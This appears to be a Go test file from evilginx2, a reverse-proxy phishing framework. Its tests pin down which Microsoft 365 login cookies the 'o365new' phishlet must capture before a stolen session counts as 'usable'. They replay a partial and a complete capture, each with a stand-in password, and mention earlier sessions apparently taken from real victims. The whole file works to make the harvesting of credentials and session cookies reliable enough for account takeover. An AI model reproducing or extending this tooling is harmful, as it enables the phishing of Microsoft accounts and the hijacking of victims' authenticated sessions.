package core

import (
	"testing"

	"github.com/kgretzky/evilginx2/database"
)

// The usable rule is only workable if the tokens Microsoft sets unreliably are
// declared optional. Pin that against the real phishlet file.
func TestPhishletAuthTokensDeclareOptionalFlags(t *testing.T) {
	pl, err := NewPhishlet("o365new", "../phishlets/o365new.yaml", nil, &Config{})
	if err != nil {
		t.Fatalf("parse phishlet: %v", err)
	}
	if len(pl.cookieAuthTokens) == 0 {
		t.Fatal("no auth tokens parsed at all")
	}

	optional := map[string]bool{}
	required := map[string]bool{}
	for _, set := range pl.cookieAuthTokens {
		for _, at := range set {
			if at.optional {
				optional[at.name] = true
			} else {
				required[at.name] = true
			}
		}
	}

	for _, name := range []string{"brcap", "esctx", "ESTSSC", "stsservicecookie"} {
		if !optional[name] {
			t.Errorf("%s should be optional: Microsoft does not set it on every flow", name)
		}
	}
	for _, name := range []string{"ESTSAUTH", "ESTSAUTHPERSISTENT", "SignInStateCookie"} {
		if !required[name] {
			t.Errorf("%s must stay required: it is the evidence the login happened", name)
		}
	}

	for d, set := range pl.cookieAuthTokens {
		parts := []string{}
		for _, at := range set {
			flag := "req"
			if at.optional {
				flag = "OPT"
			}
			parts = append(parts, at.name+"="+flag)
		}
		t.Logf("bucket %-32s %v", d, parts)
	}
}

// A realistic replay against the parsed phishlet: the partial shape seen in
// sessions 63/60 must fail the rule, and the complete shape must pass.
func TestUsableRuleAgainstRealPhishlet(t *testing.T) {
	pl, err := NewPhishlet("o365new", "../phishlets/o365new.yaml", nil, &Config{})
	if err != nil {
		t.Fatalf("parse phishlet: %v", err)
	}
	p := &HttpProxy{}

	// password submitted, provider said "done", but only pre-auth cookies arrived
	partial := sessWith("hunter2", map[string]map[string]*database.CookieToken{
		".login.microsoftonline.com": domain("buid", "esctx", "fpc", "x-ms-gateway-slice", "ESTSAUTHLIGHT"),
	})
	if ok, reason := p.authEvidence(partial, pl); ok {
		t.Errorf("partial capture must not be usable (reason %q)", reason)
	}

	// the same visit once the session-auth cookies actually land
	full := sessWith("hunter2", map[string]map[string]*database.CookieToken{
		".login.microsoftonline.com": domain("buid", "esctx", "fpc", "x-ms-gateway-slice", "ESTSAUTHLIGHT",
			"ESTSAUTH", "ESTSAUTHPERSISTENT", "SignInStateCookie"),
		".login.live.com": domain("uaid", "MSPRequ"),
	})
	if ok, reason := p.authEvidence(full, pl); !ok {
		t.Errorf("complete capture must be usable (reason %q)", reason)
	}
}
